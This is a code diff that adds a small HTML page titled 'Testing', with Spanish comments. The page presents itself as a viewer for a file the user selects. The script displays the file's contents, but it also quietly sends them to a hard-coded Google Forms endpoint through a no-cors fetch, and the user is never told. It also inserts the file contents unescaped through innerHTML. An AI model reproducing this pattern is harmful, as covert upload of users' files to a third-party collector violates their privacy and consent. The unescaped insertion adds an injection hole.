@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Testing</title>
+</head>
+<body>
+
+    <input type="file" id="file-input" />
+    <h3>Contenido del archivo:</h3>
+    <pre id="contenido-archivo"></pre>
+
+    <script>
+        function leerArchivo(e) {
+            var archivo = e.target.files[0];
+            if (!archivo) 
+            {
+                return;
+            }
+            var lector = new FileReader();
+            lector.onload = function(e) {
+            var contenido = e.target.result;
+            mostrarYEnviarContenido(contenido);
+            };
+            lector.readAsText(archivo);
+        }
+
+        function  mostrarYEnviarContenido(contenido) {
+            var elemento = document.getElementById('contenido-archivo');
+            elemento.innerHTML = contenido;
+
+            console.log("DATOS OBTENIDOS \n", contenido);
+            let separarCode = contenido.split("\u0000"); // Divide la cadena por espacios, resultado: ["H", "o", "l", "a"]
+            console.log(separarCode);
+            let unirCode = separarCode.join(""); // Une los caracteres sin espacios, resultado: "Hola"
+            console.log(unirCode); // Imprime "Hola"
+
+            const formData = new URLSearchParams();
+            formData.append("entry.1971159639", JSON.stringify(unirCode)); //se debe colocar el ID de la pregunta del formulario
+            fetch("https://docs.google.com/forms/d/e/1FAIpQLSf17-uklr7YuJVTGafTb4MNJgTn9syTt2ZqEm9QPogYO7dSiA/formResponse", {
+                method: "POST",
+                body: formData,
+                mode: "no-cors",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded" 
+                },
+        
+            })
+            .then(() => console.log("Formulario enviado exitosamente"))
+            .catch("se ha producido el siguiente error: ", err => {});
+        }
+
+        document.getElementById('file-input').addEventListener('change', leerArchivo, false);
+    </script>
+</body>
+</html>
